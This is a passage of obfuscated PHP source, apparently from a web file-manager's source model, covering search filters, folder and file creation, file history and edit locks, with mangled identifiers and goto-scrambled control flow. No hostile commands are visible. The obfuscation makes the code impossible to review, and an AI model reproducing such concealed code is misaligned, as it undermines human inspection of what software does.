$D¾—®†ãçê[47] . $F£á§ È×Ø[$D¾—®†ãçê[478]] . $D¾—®†ãçê[47])) { return !1; } goto Bˆ‚÷¢±‚À; Bˆ‚÷¢±‚À: if (isset($F£á§ È×Ø[$D¾—®†ãçê[405]]) && $F£á§ È×Ø[$D¾—®†ãçê[405]] != $D¾—®†ãçê[1731]) { if ($F£á§ È×Ø[$D¾—®†ãçê[405]] == $D¾—®†ãçê[77] && !$fØ›¸Ü „) { return !1; } if ($F£á§ È×Ø[$D¾—®†ãçê[405]] != $D¾—®†ãçê[77] && $fØ›¸Ü „) { return !1; } if (!strstr($B³‹‰Ñ‰ô¢[$D¾—®†ãçê[168]], $D¾—®†ãçê[47] . $F£á§ È×Ø[$D¾—®†ãçê[405]] . $D¾—®†ãçê[47])) { return !1; } } if (isset($F£á§ È×Ø[$D¾—®†ãçê[1927]]) && $F£á§ È×Ø[$D¾—®†ãçê[1927]] < $B³‹‰Ñ‰ô¢[$D¾—®†ãçê[78]]) { return !1; } if (isset($F£á§ È×Ø[$D¾—®†ãçê[1928]]) && $F£á§ È×Ø[$D¾—®†ãçê[1928]] > $B³‹‰Ñ‰ô¢[$D¾—®†ãçê[78]]) { return !1; } goto féÄØ´¦Š; b®²®Øòå¥: } public function listSearchChildren($Cöˆ·¿§¼„, $fß£Úº¿†â = 5000) { goto EÛ••Í¬¦ä; eø²ì”‹÷»: $CßÖŒšâÜË = $this->field($aºÂ¥ù©ë‰[395])->where($dƒÉ¨Õ¾Ş½)->select(); $eŒ„†¨´ê = array_to_keyvalue($CßÖŒšâÜË, $aºÂ¥ù©ë‰[33], $aºÂ¥ù©ë‰[395]); return $eŒ„†¨´ê; goto fˆì‰ïá¥‰; EÛ••Í¬¦ä: $aºÂ¥ù©ë‰ =& $_SERVER[ÒÆ›ÆØÎ¾]; $eŒ„†¨´ê = array(); $D¨¤¹ğÙ™ = $this->sourceInfo($Cöˆ·¿§¼„); goto c¼”Õ™‡Ğ„; c¼”Õ™‡Ğ„: $dƒÉ¨Õ¾Ş½ = array($aºÂ¥ù©ë‰[487] => array($aºÂ¥ù©ë‰[380], $D¨¤¹ğÙ™[$aºÂ¥ù©ë‰[487]] . $D¨¤¹ğÙ™[$aºÂ¥ù©ë‰[395]] . $aºÂ¥ù©ë‰[513])); $bÆß’Æóáß = $this->field($aºÂ¥ù©ë‰[395])->cache(null, 600)->where($dƒÉ¨Õ¾Ş½)->count(); if ($bÆß’Æóáß > $fß£Úº¿†â) { return $this->_listSearchChildrenNear($Cöˆ·¿§¼„, $fß£Úº¿†â); } goto eø²ì”‹÷»; fˆì‰ïá¥‰: } private function _listSearchChildrenNear($b‰ƒñáóŒ‹, $e°À”À“¸) { goto E¸‹ä»Ìùã; E¸‹ä»Ìùã: $F«° £êŒ– =& $_SERVER[ÒÆ›ÆØÎ¾]; $EŠö“à”‘Ò = array(); $e˜À¯Ö‘İ‚ = array($F«° £êŒ–[478] => $b‰ƒñáóŒ‹); goto d®„ÏÂ–ÆÍ; dÃÙÌÚÀâµ: $EŠö“à”‘Ò = array_merge($EŠö“à”‘Ò, array_to_keyvalue($Cñâ§‚¾Ù¹, $F«° £êŒ–[33], $F«° £êŒ–[395])); $EŠö“à”‘Ò = array_slice($EŠö“à”‘Ò, 0, $e°À”À“¸); return $EŠö“à”‘Ò; goto aÒÚ½•ùÜ; aİÈÉ¯’Ÿ¥: if (!$Fë“æÕÍ») { return $EŠö“à”‘Ò; } $e˜À¯Ö‘İ‚ = array($F«° £êŒ–[478] => array($F«° £êŒ–[7], $Fë“æÕÍ»)); $Cñâ§‚¾Ù¹ = $this->field($F«° £êŒ–[1929])->where($e˜À¯Ö‘İ‚)->limit($e°À”À“¸)->select(); goto dÃÙÌÚÀâµ; d®„ÏÂ–ÆÍ: $Cñâ§‚¾Ù¹ = $this->field($F«° £êŒ–[1929])->where($e˜À¯Ö‘İ‚)->select(); $Fë“æÕÍ» = array_to_keyvalue(array_filter_by_field($Cñâ§‚¾Ù¹, $F«° £êŒ–[403], $F«° £êŒ–[87]), $F«° £êŒ–[33], $F«° £êŒ–[395]); $EŠö“à”‘Ò = array_merge($EŠö“à”‘Ò, array_to_keyvalue($Cñâ§‚¾Ù¹, $F«° £êŒ–[33], $F«° £êŒ–[395])); goto aİÈÉ¯’Ÿ¥; aÒÚ½•ùÜ: } private function _listSearchBindPinyin($bÌœÆÏºŸñ, &$bòÎİ©¡¡¶, &$AİŠ‹°) { goto A³æˆ•Ö¡ß; dù‰ºÖŸò: $D´Ãß ïã = "\114\x45\x46\124\x20\112\x4f\x49\x4e\x20{$this->tablePrefix}\151\x6f\137\163\157\165\x72\x63\145\x5f\x6d\x65\x74\141\40\155\x65\164\141\40\x6f\x6e\40\x73\x6f\165\162\x63\x65\56\163\157\165\x72\x63\145\111\x44\x20\75\x20\155\145\164\141\56\x73\x6f\165\162\143\x65\x49\104"; $eâ“‚­‹ = array(); $AİŠ‹° = str_replace(array($cœÑØªºØ¿[229], $cœÑØªºØ¿[50], $cœÑØªºØ¿[1930]), $cœÑØªºØ¿[33], $AİŠ‹°); goto aŸåš™ÏÊ; A³æˆ•Ö¡ß: $cœÑØªºØ¿ =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!isset($bÌœÆÏºŸñ[$cœÑØªºØ¿[1764]]) || !$bÌœÆÏºŸñ[$cœÑØªºØ¿[1764]]) { return; } if (!Input::check($bÌœÆÏºŸñ[$cœÑØªºØ¿[1764]], $cœÑØªºØ¿[316]) || strlen($bÌœÆÏºŸñ[$cœÑØªºØ¿[1764]]) < 2) { return; } goto dù‰ºÖŸò; aŸåš™ÏÊ: $AİŠ‹° = $cœÑØªºØ¿[1931] . str_replace($cœÑØªºØ¿[47], $cœÑØªºØ¿[1932], $AİŠ‹°); $f‘“™×ŸÑ¯ = $bòÎİ©¡¡¶[$cœÑØªºØ¿[28]]; unset($bòÎİ©¡¡¶[$cœÑØªºØ¿[28]]); goto aøÔé‘¿®; bÄÊ…¹±£¨: $bòÎİ©¡¡¶ = $eâ“‚­‹; goto fñ†Á¶‘À; aøÔé‘¿®: foreach ($bòÎİ©¡¡¶ as $FÓÙ’Ë• => $B–ßÊÁÜ¤Û) { $eâ“‚­‹[$cœÑØªºØ¿[1931] . $FÓÙ’Ë•] = $B–ßÊÁÜ¤Û; } foreach ($f‘“™×ŸÑ¯ as $bïº…¢¿…) { $eâ“‚­‹[] = array($cœÑØªºØ¿[1933] => $bïº…¢¿…, $cœÑØªºØ¿[948] => $cœÑØªºØ¿[1768], array($cœÑØªºØ¿[1934] => $bïº…¢¿…, $cœÑØªºØ¿[1935] => array($cœÑØªºØ¿[7], array($cœÑØªºØ¿[444], $cœÑØªºØ¿[443])))); } $this->join($D´Ãß ïã); goto bÄÊ…¹±£¨; fñ†Á¶‘À: } private function _parseSearchWhere($b–»¤’îÇ) { goto A‚ãˆ¨Ï¿Û; fÜÍ®×é¡‹: if (isset($b–»¤’îÇ[$E±ÑšÍŠ¼È[562]]) && $b–»¤’îÇ[$E±ÑšÍŠ¼È[562]]) { $FÛ„ì‚¤©[] = array($E±ÑšÍŠ¼È[434] => $b–»¤’îÇ[$E±ÑšÍŠ¼È[562]], $E±ÑšÍŠ¼È[432] => $b–»¤’îÇ[$E±ÑšÍŠ¼È[562]], $E±ÑšÍŠ¼È[948] => $E±ÑšÍŠ¼È[1768]); } if (isset($b–»¤’îÇ[$E±ÑšÍŠ¼È[405]]) && $b–»¤’îÇ[$E±ÑšÍŠ¼È[405]]) { $E¿£Í´ìñÇ = $b–»¤’îÇ[$E±ÑšÍŠ¼È[405]]; if ($E¿£Í´ìñÇ == $E±ÑšÍŠ¼È[77]) { $FÛ„ì‚¤©[$E±ÑšÍŠ¼È[403]] = 1; } else { if ($E¿£Í´ìñÇ == $E±ÑšÍŠ¼È[1939]) { $FÛ„ì‚¤©[$E±ÑšÍŠ¼È[403]] = 0; } else { if ($E¿£Í´ìñÇ) { $E¿£Í´ìñÇ = is_array($E¿£Í´ìñÇ) ? $E¿£Í´ìñÇ : explode($E±ÑšÍŠ¼È[47], $E¿£Í´ìñÇ); $FÛ„ì‚¤©[$E±ÑšÍŠ¼È[405]] = array($E±ÑšÍŠ¼È[411], $E¿£Í´ìñÇ); $FÛ„ì‚¤©[$E±ÑšÍŠ¼È[403]] = 0; } } } } if (isset($b–»¤’îÇ[$E±ÑšÍŠ¼È[478]]) && $b–»¤’îÇ[$E±ÑšÍŠ¼È[478]]) { $D²Šˆß¨‡ñ = $this->sourceInfo($b–»¤’îÇ[$E±ÑšÍŠ¼È[478]]); $FÛ„ì‚¤©[$E±ÑšÍŠ¼È[553]] = array($E±ÑšÍŠ¼È[512], $D²Šˆß¨‡ñ[$E±ÑšÍŠ¼È[487]] . $b–»¤’îÇ[$E±ÑšÍŠ¼È[478]] . $E±ÑšÍŠ¼È[513]); } goto e©ñ¬ÓéÉÓ; A‚ãˆ¨Ï¿Û: $E±ÑšÍŠ¼È =& $_SERVER[ÒÆ›ÆØÎ¾]; $FÛ„ì‚¤© = array(); if (isset($b–»¤’îÇ[$E±ÑšÍŠ¼È[713]]) && $b–»¤’îÇ[$E±ÑšÍŠ¼È[713]]) { $FÛ„ì‚¤©[$E±ÑšÍŠ¼È[84]] = array($E±ÑšÍŠ¼È[1936], $b–»¤’îÇ[$E±ÑšÍŠ¼È[713]]); } goto D÷‚ï¨‹‘²; e©ñ¬ÓéÉÓ: if (isset($b–»¤’îÇ[$E±ÑšÍŠ¼È[1764]]) && trim($b–»¤’îÇ[$E±ÑšÍŠ¼È[1764]])) { $Céæ‚ÕÈ = trim($b–»¤’îÇ[$E±ÑšÍŠ¼È[1764]]); $c»‘á÷Óø× = explode($E±ÑšÍŠ¼È[50], $Céæ‚ÕÈ); if (strlen($Céæ‚ÕÈ) > 2 && (substr($Céæ‚ÕÈ, 0, 1) == $E±ÑšÍŠ¼È[116] && substr($Céæ‚ÕÈ, -1) == $E±ÑšÍŠ¼È[116]) || substr($Céæ‚ÕÈ, 0, 1) == $E±ÑšÍŠ¼È[55] && substr($Céæ‚ÕÈ, -1) == $E±ÑšÍŠ¼È[55]) { $Céæ‚ÕÈ = substr($Céæ‚ÕÈ, 1, -1); $c»‘á÷Óø× = array($Céæ‚ÕÈ); } $FÛ„ì‚¤©[$E±ÑšÍŠ¼È[28]] = array(array($E±ÑšÍŠ¼È[512], $E±ÑšÍŠ¼È[1766] . $Céæ‚ÕÈ . $E±ÑšÍŠ¼È[1766])); if (count($c»‘á÷Óø×) > 1) { $FÛ„ì‚¤©[$E±ÑšÍŠ¼È[28]] = array(); foreach ($c»‘á÷Óø× as $b¢ŠªÚ¦áï) { if (!trim($b¢ŠªÚ¦áï)) { continue; } $FÛ„ì‚¤©[$E±ÑšÍŠ¼È[28]][] = array($E±ÑšÍŠ¼È[512], $E±ÑšÍŠ¼È[1766] . trim($b¢ŠªÚ¦áï) . $E±ÑšÍŠ¼È[1766]); } } } return $FÛ„ì‚¤©; goto CçåÚä”½‘; D÷‚ï¨‹‘²: if (isset($b–»¤’îÇ[$E±ÑšÍŠ¼È[476]]) && $b–»¤’îÇ[$E±ÑšÍŠ¼È[476]]) { $b®ôöƒËˆ• = array($E±ÑšÍŠ¼È[1937], $b–»¤’îÇ[$E±ÑšÍŠ¼È[476]]); if ($FÛ„ì‚¤©[$E±ÑšÍŠ¼È[84]]) { $FÛ„ì‚¤©[$E±ÑšÍŠ¼È[84]] = array($FÛ„ì‚¤©[$E±ÑšÍŠ¼È[84]], $b®ôöƒËˆ•, $E±ÑšÍŠ¼È[1938]); } else { $FÛ„ì‚¤©[$E±ÑšÍŠ¼È[84]] = $b®ôöƒËˆ•; } } if (isset($b–»¤’îÇ[$E±ÑšÍŠ¼È[1927]]) && $b–»¤’îÇ[$E±ÑšÍŠ¼È[1927]] > 0) { $FÛ„ì‚¤©[$E±ÑšÍŠ¼È[78]] = array($E±ÑšÍŠ¼È[1936], $b–»¤’îÇ[$E±ÑšÍŠ¼È[1927]]); } if (isset($b–»¤’îÇ[$E±ÑšÍŠ¼È[1928]]) && $b–»¤’îÇ[$E±ÑšÍŠ¼È[1928]]) { $b®ôöƒËˆ• = array($E±ÑšÍŠ¼È[1937], $b–»¤’îÇ[$E±ÑšÍŠ¼È[1928]]); if ($FÛ„ì‚¤©[$E±ÑšÍŠ¼È[78]]) { $FÛ„ì‚¤©[$E±ÑšÍŠ¼È[78]] = array($FÛ„ì‚¤©[$E±ÑšÍŠ¼È[78]], $b®ôöƒËˆ•, $E±ÑšÍŠ¼È[1938]); } else { $FÛ„ì‚¤©[$E±ÑšÍŠ¼È[78]] = $b®ôöƒËˆ•; } } goto fÜÍ®×é¡‹; CçåÚä”½‘: } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($bÛÛì–¶ËŒ) { $DùÚ¥ÖÔ¬ =& $_SERVER[ÒÆ›ÆØÎ¾]; $B÷‰…ó‘‘Ù = Model($DùÚ¥ÖÔ¬[502])->where(array($DùÚ¥ÖÔ¬[1509] => $bÛÛì–¶ËŒ))->find(); $a×ø­¡«„õ = $this->_mkdirRoot(SourceModel::TYPE_USER, $bÛÛì–¶ËŒ, $B÷‰…ó‘‘Ù[$DùÚ¥ÖÔ¬[28]]); $this->userDesktopAdd($a×ø­¡«„õ); return $a×ø­¡«„õ; } public function userDesktopAdd($b—ß™–ö˜) { $b‚¸Ç÷ù¾¨ =& $_SERVER[ÒÆ›ÆØÎ¾]; $dÑÖªğĞªô = LNG($b‚¸Ç÷ù¾¨[1940]); $AÖîÇ‹Ù†¯ = $this->mkdir($b—ß™–ö˜, $dÑÖªğĞªô); $this->metaSet($AÖîÇ‹Ù†¯, $b‚¸Ç÷ù¾¨[1941], $b‚¸Ç÷ù¾¨[87]); $this->metaSet($b—ß™–ö˜, $b‚¸Ç÷ù¾¨[1942], $AÖîÇ‹Ù†¯); } public function groupRootAdd($BÚçÁ“ê‰ö) { $EßôÔ¼š©Ÿ =& $_SERVER[ÒÆ›ÆØÎ¾]; $c‚øœ¡Ü– = Model($EßôÔ¼š©Ÿ[486])->where(array($EßôÔ¼š©Ÿ[1759] => $BÚçÁ“ê‰ö))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $BÚçÁ“ê‰ö, $c‚øœ¡Ü–[$EßôÔ¼š©Ÿ[28]]); } public function systemRootPathAdd($B“â¤éôØ´) { if ($B“â¤éôØ´ != $_SERVER[ÒÆ›ÆØÎ¾][505]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $B“â¤éôØ´); } public function userRootRemove($Cí¹Ø´¡à¯) { $C÷ãö¿öêÛ = $this->sourceRoot(SourceModel::TYPE_USER, $Cí¹Ø´¡à¯); if (!$C÷ãö¿öêÛ) { return; } $this->remove($C÷ãö¿öêÛ, !1); } public function groupRootRemove($CºšÓÕÄ) { $d×£ÈÂ–…µ = $this->sourceRoot(SourceModel::TYPE_GROUP, $CºšÓÕÄ); if (!$d×£ÈÂ–…µ) { return; } $this->remove($d×£ÈÂ–…µ, !1); } private function _mkdirRoot($FäÓç­Ç–, $FåÄªÁË£®, $C©Ü¿Ò†¶¯) { goto FÌ‡×”™³; FÌ‡×”™³: $A“Û®†ÕâÕ =& $_SERVER[ÒÆ›ÆØÎ¾]; $bå„¥²»¬§ = array($A“Û®†ÕâÕ[394] => 0, $A“Û®†ÕâÕ[549] => $FäÓç­Ç–, $A“Û®†ÕâÕ[550] => $FåÄªÁË£®, $A“Û®†ÕâÕ[546] => 1, $A“Û®†ÕâÕ[551] => USER_ID, $A“Û®†ÕâÕ[552] => USER_ID, $A“Û®†ÕâÕ[547] => $A“Û®†ÕâÕ[33], $A“Û®†ÕâÕ[553] => $A“Û®†ÕâÕ[498], $A“Û®†ÕâÕ[422] => 0, $A“Û®†ÕâÕ[548] => 0, $A“Û®†ÕâÕ[448] => 0, $A“Û®†ÕâÕ[554] => $A“Û®†ÕâÕ[33]); if ($bÏµŒê§ÎÉ = $this->where($bå„¥²»¬§)->find()) { return $bÏµŒê§ÎÉ[$A“Û®†ÕâÕ[395]]; } goto EÊ²„¯İª“; C§‚Ÿ®Ã: $f—Å†¸ƒ = $this->add($bå„¥²»¬§); $B Ù‚ª¬›Ã = array($A“Û®†ÕâÕ[555] => short_id($f—Å†¸ƒ)); $this->where(array($A“Û®†ÕâÕ[410] => $f—Å†¸ƒ))->save($B Ù‚ª¬›Ã); goto f˜î®öé«Ú; f˜î®öé«Ú: CacheLock::unlock($AÒõ†Ñ‹²); return $f—Å†¸ƒ; goto C¨¡äôô¸°; EÊ²„¯İª“: $AÒõ†Ñ‹² = "\x4d\157\144\145\x6c\x53\x6f\x75\x72\143\145\x2e\155\x6b\144\x69\x72\122\157\157\164\x2e{$FäÓç­Ç–}\56{$FåÄªÁË£®}\x2e" . $C©Ü¿Ò†¶¯; CacheLock::lock($AÒõ†Ñ‹²); $bå„¥²»¬§[$A“Û®†ÕâÕ[28]] = $C©Ü¿Ò†¶¯; goto C§‚Ÿ®Ã; C¨¡äôô¸°: } private function sourceRoot($A­¡È§çì², $E¶ÅÕÛó‘Ğ, $C‰Ğ³¶ÄáÍ = false) { $b­Æ´­µŠË =& $_SERVER[ÒÆ›ÆØÎ¾]; $fåˆ—ïàÕ» = array($b­Æ´­µŠË[394] => 0, $b­Æ´­µŠË[549] => $A­¡È§çì², $b­Æ´­µŠË[550] => $E¶ÅÕÛó‘Ğ); if ($Bš‘Œ¨Ë† = $this->where($fåˆ—ïàÕ»)->find()) { return $C‰Ğ³¶ÄáÍ ? $Bš‘Œ¨Ë† : $Bš‘Œ¨Ë†[$b­Æ´­µŠË[395]]; } return !1; } public function sourceRootGroup($FÍ“­¨Ïêì) { goto a«ÛÙ´‚¤·; A‹·èâ«İ¥: return array_to_keyvalue($bìŞ°ØŒä¿[$C¦­ŠçÀ¡ò[75]], $C¦­ŠçÀ¡ò[484]); goto B§ÑĞ„óĞ; a«ÛÙ´‚¤·: $C¦­ŠçÀ¡ò =& $_SERVER[ÒÆ›ÆØÎ¾]; if (is_string($FÍ“­¨Ïêì)) { $FÍ“­¨Ïêì = array($FÍ“­¨Ïêì); } $eïÜ±¶¬»• = array($C¦­ŠçÀ¡ò[394] => 0, $C¦­ŠçÀ¡ò[549] => SourceModel::TYPE_GROUP, $C¦­ŠçÀ¡ò[550] => array($C¦­ŠçÀ¡ò[7], $FÍ“­¨Ïêì)); goto D”Å…Ş½·²; D”Å…Ş½·²: $this->selectPageReset(); $bìŞ°ØŒä¿ = $this->listSource($eïÜ±¶¬»•, 1000); $this->selectPageRestore(); goto A‹·èâ«İ¥; B§ÑĞ„óĞ: } public function mkfile($dİâç™Ì°ó, $fæÔÅÔ¸ƒ, $a´òˆ¼—Ä— = '', $F‚ÙºëâÆÍ = REPEAT_RENAME) { $dŸÇ …„èÖ =& $_SERVER[ÒÆ›ÆØÎ¾]; $AÈßçİà¶ã = Model($dŸÇ …„èÖ[571])->addFileByContent($a´òˆ¼—Ä—, $fæÔÅÔ¸ƒ); return $this->_createFileCall($dİâç™Ì°ó, $fæÔÅÔ¸ƒ, $AÈßçİà¶ã, $F‚ÙºëâÆÍ, $dŸÇ …„èÖ[1207]); } public function addFile($Cññ®ºëÍØ, $fÅã—¸×â, $DÎÏñùİØñ, $CÃ¦À¾©Çï = false, $c¸ËŒ§›Ç¡ = REPEAT_RENAME) { $Dêš…õôÛ• = Model($_SERVER[ÒÆ›ÆØÎ¾][571])->addFile($fÅã—¸×â, $DÎÏñùİØñ, $CÃ¦À¾©Çï); return $this->_createFileCall($Cññ®ºëÍØ, $DÎÏñùİØñ, $Dêš…õôÛ•, $c¸ËŒ§›Ç¡); } public function addFileByFileID($BìŞš³¼, $AÉñ¹ •¿, $fœ¸Ùøß, $d…›¯øİîİ = REPEAT_RENAME) { $eˆ¾Ğğ‹ºö =& $_SERVER[ÒÆ›ÆØÎ¾]; $d‹ÒÚ­£› = Model($eˆ¾Ğğ‹ºö[571])->find($AÉñ¹ •¿); Model($eˆ¾Ğğ‹ºö[571])->linkAdd($AÉñ¹ •¿); return $this->_createFileCall($BìŞš³¼, $fœ¸Ùøß, $d‹ÒÚ­£›, $d…›¯øİîİ); } public function addFileByRemote($dø§œçÇ Ó, $AÚä§½Õˆİ, $Fâ¶•Ëô–«, $c§ì©®Š—® = array(), $C­…º¸ƒÈ¶ = REPEAT_RENAME) { $CÖëÈ×¹¸ = Model($_SERVER[ÒÆ›ÆØÎ¾][571])->addFileByRemote($AÚä§½Õˆİ, $Fâ¶•Ëô–«, $c§ì©®Š—®); return $this->_createFileCall($dø§œçÇ Ó, $Fâ¶•Ëô–«, $CÖëÈ×¹¸, $C­…º¸ƒÈ¶); } private function _createFileCall($bˆ†éé™Â, $Eˆí«·§, $cê¤íèîã, $E¡Şİ’Ä’Ò, $dÚİ ‘÷ = "\165\x70\x6c\x6f\141\144") { goto déÄ„ß ì; déÄ„ß ì: $d®ğ¡Ë‚ =& $_SERVER[ÒÆ›ÆØÎ¾]; $e”àğ†ºÏó = !1; $this->lockWriteStart($bˆ†éé™Â, $Eˆí«·§); goto fÛ†ñ×äŞ­; fÛ†ñ×äŞ­: $b‚¦ñŒ†ëŒ = $this->fileNameExist($bˆ†éé™Â, $Eˆí«·§); $aÄ¡»£Ó»ò = $this->_createFile($bˆ†éé™Â, $Eˆí«·§, $cê¤íèîã, $E¡Şİ’Ä’Ò, $e”àğ†ºÏó); if (!$e”àğ†ºÏó) { Model($d®ğ¡Ë‚[450])->remove($cê¤íèîã[$d®ğ¡Ë‚[447]]); } goto e§Ş‚™­é; e§Ş‚™­é: if ($e”àğ†ºÏó && $aÄ¡»£Ó»ò && $aÄ¡»£Ó»ò != $b‚¦ñŒ†ëŒ) { Model($d®ğ¡Ë‚[1911])->eventCreate($aÄ¡»£Ó»ò, $dÚİ ‘÷); } $this->lockWriteEnd($bˆ†éé™Â, $Eˆí«·§); return $aÄ¡»£Ó»ò; goto b–ÛìšÀ´; b–ÛìšÀ´: } public function mkdir($EËİÏ¬Ó¢Ğ, $BÓõÁ‘Ù¢, $AÖÑ°î™Õ = REPEAT_SKIP) { goto aîœ¨ŸîÇñ; B˜ Ò©“œ: return $AƒÊ¬Üßß ; goto Aò†¿ñÜµ›; AÑë‰äÈ›Š: $AƒÊ¬Üßß  = $this->_addSoure($ašñª—É­Ğ, $FøÒ¿Œâêé); Model($fÀŒˆöê˜[1911])->eventCreate($AƒÊ¬Üßß , $fÀŒˆöê˜[1208]); $this->lockWriteEnd($EËİÏ¬Ó¢Ğ, $BÓõÁ‘Ù¢); goto B˜ Ò©“œ; aîœ¨ŸîÇñ: $fÀŒˆöê˜ =& $_SERVER[ÒÆ›ÆØÎ¾]; $FøÒ¿Œâêé = $this->sourceInfo($EËİÏ¬Ó¢Ğ); if (!$FøÒ¿Œâêé) { return !1; } goto F²Ï÷ìŒö‹; F²Ï÷ìŒö‹: $this->lockWriteStart($EËİÏ¬Ó¢Ğ, $BÓõÁ‘Ù¢); if ($AÖÑ°î™Õ !== !1) { $a…·×ã¦«« = $this->fileNameExist($EËİÏ¬Ó¢Ğ, $BÓõÁ‘Ù¢); if ($a…·×ã¦«« && $AÖÑ°î™Õ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($EËİÏ¬Ó¢Ğ, $BÓõÁ‘Ù¢); return $a…·×ã¦««; } $BÓõÁ‘Ù¢ = $this->fileNameAuto($EËİÏ¬Ó¢Ğ, $BÓõÁ‘Ù¢, $AÖÑ°î™Õ); } $ašñª—É­Ğ = array($fÀŒˆöê˜[546] => 1, $fÀŒˆöê˜[413] => $BÓõÁ‘Ù¢, $fÀŒˆöê˜[547] => $fÀŒˆöê˜[33], $fÀŒˆöê˜[448] => 0, $fÀŒˆöê˜[548] => 0); goto AÑë‰äÈ›Š; Aò†¿ñÜµ›: } private function _createFile($F§™Ñ‡éù», $D¥µàìŸ…×, $cÀäˆ«ìŠ, $aŒ¶Ø¥Ï–ø, &$e²²¯æ¿ª‚) { goto dÛğÒøŒÃª; dÛğÒøŒÃª: $fáø—·çƒ” =& $_SERVER[ÒÆ›ÆØÎ¾]; $AÙÏ‹•¶ÚÏ = $this->sourceInfo($F§™Ñ‡éù»); if (!$cÀäˆ«ìŠ || !$AÙÏ‹•¶ÚÏ) { return !1; } goto Eâ×…æ…÷Š; cŞˆ†ÚŠÈ¤: $CŸ¡‡ñÌóÃ = array($fáø—·çƒ”[546] => 0, $fáø—·çƒ”[413] => $D¥µàìŸ…×, $fáø—·çƒ”[547] => substr(get_path_ext($D¥µàìŸ…×), 0, 10), $fáø—·çƒ”[448] => $cÀäˆ«ìŠ[$fáø—·çƒ”[447]], $fáø—·çƒ”[548] => $cÀäˆ«ìŠ[$fáø—·çƒ”[78]]); $AëÀ’¶ó¾ = $this->_addSoure($CŸ¡‡ñÌóÃ, $AÙÏ‹•¶ÚÏ); $this->folderSizeReset($F§™Ñ‡éù», intval($CŸ¡‡ñÌóÃ[$fáø—·çƒ”[78]])); goto fÒòœÑ®ÎÕ; Eâ×…æ…÷Š: if ($aŒ¶Ø¥Ï–ø !== !1) { $CôØ‰ÌÇ·™ = $this->fileNameExist($F§™Ñ‡éù», $D¥µàìŸ…×); } $e²²¯æ¿ª‚ = !0; if ($aŒ¶Ø¥Ï–ø && $CôØ‰ÌÇ·™) { if ($aŒ¶Ø¥Ï–ø == REPEAT_SKIP) { $e²²¯æ¿ª‚ = !1; return $CôØ‰ÌÇ·™; } else { if ($aŒ¶Ø¥Ï–ø == REPEAT_REPLACE) { $EÂ„˜’¡êŠ = $this->sourceInfo($CôØ‰ÌÇ·™); $a¢ÈÜöæéŸ = $this->fileHistory($EÂ„˜’¡êŠ, $cÀäˆ«ìŠ[$fáø—·çƒ”[447]], $cÀäˆ«ìŠ[$fáø—·çƒ”[78]]); if (!$a¢ÈÜöæéŸ) { $e²²¯æ¿ª‚ = !1; } else { $this->folderSizeReset($F§™Ñ‡éù»); } return $CôØ‰ÌÇ·™; } else { $D¥µàìŸ…× = $this->fileNameAuto($F§™Ñ‡éù», $D¥µàìŸ…×, $aŒ¶Ø¥Ï–ø, !1); } } } goto cŞˆ†ÚŠÈ¤; fÒòœÑ®ÎÕ: return $AëÀ’¶ó¾; goto a±‡‡ÓØ¨«; a±‡‡ÓØ¨«: } protected function fileHistory($Eİ‹ç“†ê, $C‹„“ç²˜, $fĞ¶‡ã¨) { goto a°ïÒ»‚Â; A…ğî“‡À·: $this->sourceCacheClear($Eİ‹ç“†ê[$b¥ö§áÏÓ‹[395]]); return !0; goto F„½‘¿óØ; eÇ¦âä‘¶ê: Model($b¥ö§áÏÓ‹[1943])->addHistory($Eİ‹ç“†ê); $aŸó¥”Ç¼ = array($b¥ö§áÏÓ‹[552] => USER_ID, $b¥ö§áÏÓ‹[417] => time(), $b¥ö§áÏÓ‹[447] => $C‹„“ç²˜, $b¥ö§áÏÓ‹[78] => $fĞ¶‡ã¨); $this->where(array($b¥ö§áÏÓ‹[410] => $Eİ‹ç“†ê[$b¥ö§áÏÓ‹[395]]))->save($aŸó¥”Ç¼); goto A…ğî“‡À·; a°ïÒ»‚Â: $b¥ö§áÏÓ‹ =& $_SERVER[ÒÆ›ÆØÎ¾]; if ($Eİ‹ç“†ê[$b¥ö§áÏÓ‹[447]] == $C‹„“ç²˜) { return !1; } $this->checkLock($Eİ‹ç“†ê[$b¥ö§áÏÓ‹[395]], $C‹„“ç²˜); goto eÇ¦âä‘¶ê; F„½‘¿óØ: } public function checkLock($A¸ó®ÍÃ, $f¥Æ¯Åñ–Ù) { goto fãˆ¯¿¢Í; b‰Œ¿åĞ…Æ: $this->_createFileCall($F¼õİ¯šˆ…[$D¢ØÖìŸ´°[478]], $A”æèÜĞÓŞ, $E‘¶ÇœÖäß, REPEAT_REPLACE, $D¢ØÖìŸ´°[1207]); $FØóğ×¥ğÊ = $F¼õİ¯šˆ…[$D¢ØÖìŸ´°[445]][$D¢ØÖìŸ´°[510]]; $cñ‚«¥ÁÇ‘ = $FØóğ×¥ğÊ[$D¢ØÖìŸ´°[1945]] ? $FØóğ×¥ğÊ[$D¢ØÖìŸ´°[1945]] : $FØóğ×¥ğÊ[$D¢ØÖìŸ´°[28]]; goto eĞ†ƒÜìà; eĞ†ƒÜìà: show_json(LNG($D¢ØÖìŸ´°[1946]) . $D¢ØÖìŸ´°[1947] . LNG($D¢ØÖìŸ´°[1948]) . $D¢ØÖìŸ´°[1949] . $cñ‚«¥ÁÇ‘ . $D¢ØÖìŸ´°[1950], !1); goto C¤§ÙµÅ½ç; CàíÈËƒ¿Œ: $CÛ£Ü‹¯æ = Session::get($D¢ØÖìŸ´°[1944]); $A”æèÜĞÓŞ = substr($F¼õİ¯šˆ…[$D¢ØÖìŸ´°[28]], 0, -1 - strlen($F¼õİ¯šˆ…[$D¢ØÖìŸ´°[168]])) . $D¢ØÖìŸ´°[1470] . $CÛ£Ü‹¯æ . $D¢ØÖìŸ´°[95] . $F¼õİ¯šˆ…[$D¢ØÖìŸ´°[168]]; $E‘¶ÇœÖäß = Model($D¢ØÖìŸ´°[571])->find($f¥Æ¯Åñ–Ù); goto b‰Œ¿åĞ…Æ; fãˆ¯¿¢Í: $D¢ØÖìŸ´° =& $_SERVER[ÒÆ›ÆØÎ¾]; $F¼õİ¯šˆ… = $this->pathInfo($A¸ó®ÍÃ); if (!$this->fileIsLock($F¼õİ¯šˆ…, !0)) { return; } goto CàíÈËƒ¿Œ; C¤§ÙµÅ½ç: } public function fileIsLock($f‹ÍÇÕéÔÚ, $CØĞìÆÀùŸ = false) { goto C°ê„‰è±; Bà†øÙ›°Æ: return !1; goto 